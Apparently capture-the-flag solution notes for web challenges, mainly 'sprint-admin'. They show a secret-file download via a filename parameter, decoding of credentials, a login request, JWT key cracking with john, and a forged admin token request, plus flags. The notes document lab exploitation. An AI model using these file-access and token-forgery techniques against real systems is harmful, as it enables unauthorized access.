# Solution

View source at `/login`

Flag: `CTF{L0g1n_M4st3r_2025}`
---

---
Category: Web
Challenge Name: sprint-admin

# Solution

Grab the secret at `/download?filename=secret`

Decode the multi-base64 strings in it and obtain the creds for `KevinM`

```
POST /login HTTP/1.1


username=KevinM&password=%5E32i6%3BxqOFYkqg%24l%3Dwq%5E8-%3FjO%5ESIpT
```

`jwt` token created, bruteforce the key using the provided `secrets.txt` file

```
john jwt.txt --wordlist=secrets.txt --format=HMAC-SHA256 
```

```
GET /admin HTTP/1.1
Host: 188.245.212.74:10037
Referer: http://188.245.212.74:10037/login
Cookie: connect.sid=s%3AqkgniFDpwODBvegOBjGQOYONDJSF8nP_.UBvyrwUAWyLhoOrF75C2mubG4H9mMRVLR%2Bi0zmTVFMI; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IktldmluTSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0MjYzNDM1NiwiZXhwIjoxNzQyNjM3OTU2fQ.GPdFBwU0ukjmF-fQMSPXJVHJQFhsS6QHaj1yKfGOSK0
```

Flag: `ping{Spr1n7_T3ch_@dm1n_fl@G}`

Solved by: yappare